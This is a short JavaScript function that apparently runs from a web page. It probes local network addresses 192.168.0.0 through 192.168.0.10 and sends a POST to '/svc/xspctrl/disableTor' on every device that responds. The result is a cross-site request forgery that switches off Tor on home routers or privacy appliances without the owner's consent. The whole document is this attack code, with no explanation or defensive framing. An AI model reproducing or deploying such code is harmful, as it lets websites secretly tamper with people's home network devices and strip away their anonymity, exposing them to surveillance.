function go() { 
   for (var j = 0; j <= 10; j++)
   {
      var tryip = "http://192.168.0." + j;
      var req = new XMLHttpRequest();
      //var tryip = "http://192.168.0.4";

      function postback() {
         console.log("Postback ");
      }
      function handletimeout(myip) {
         console.log(myip + " timed out.");
      }
      
      function handlereadychange(myip) { 
         var rs = req.readyState;
         //console.log("State is: " + rs);
         // console.log(req);
         console.log(myip + " " + rs);
         if (rs != 4) {
            return;
         }
         console.log("Done " + myip);
         if (req.status == 404) {
            console.log("404\n");
            return;
         }
         console.log(req);
         
         console.log("Sending post: " + myip);
         delete req['onreadystatechange'];

         var postreq = new XMLHttpRequest();
         postreq.open("POST", myip + "/svc/xspctrl/disableTor", true);
         postreq.onreadystatechange = postback;
         postreq.timeout = 1000;
         postreq.send();   
      }
      
      try {
         //console.log("hi");
         req.open("GET", tryip, true);
         req.timeout = 2000;
         //req.ontimeout = _.partial(handletimeout, tryip);
         req.onreadystatechange = _.partial(handlereadychange, tryip);
         req.send();
      }
      catch (error) {
         console.log("Site for " + tryip + " not found. \n<br>");
      } 
   }
}